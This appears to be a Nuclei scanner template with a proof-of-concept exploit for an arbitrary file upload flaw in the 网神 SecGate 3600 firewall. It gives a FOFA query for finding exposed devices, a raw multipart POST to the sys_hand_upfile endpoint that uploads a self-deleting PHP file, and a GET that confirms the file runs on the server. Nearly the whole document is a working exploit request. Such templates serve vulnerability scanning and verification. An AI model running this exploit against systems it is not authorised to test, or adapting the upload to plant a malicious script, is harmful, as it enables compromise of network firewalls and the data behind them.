id: wangshen-secgate-3600-rootpath-file-upload

info:
  name: "网神 SecGate 3600 防火墙 rootpath 接口任意文件上传"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="./images/lsec/login/loading.gif"
          网神 SecGate 3600 防火墙 rootpath 接口存在任意文件上传缺陷，攻击者可利用该漏洞上传恶意脚本文件，可能导致服务器执行未经授权的操作或数据泄露，从而破坏系统的完整性和可用性
  tags: 网神 SecGate 3600

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /?g=sys_hand_upfile HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    Content-Type: multipart/form-data; boundary=gttd4i4aadwh9lmlp1ez

    --gttd4i4aadwh9lmlp1ez
    Content-Disposition: form-data; name="upfile"; filename="NTest.php"

    <?php echo 'NdayTest'; unlink(__FILE__); ?>
    --gttd4i4aadwh9lmlp1ez
    Content-Disposition: form-data; name="submit_post"

    sys_hand_upfile
    --gttd4i4aadwh9lmlp1ez--
- raw:
  - |
    GET /attachements/NTest.php HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
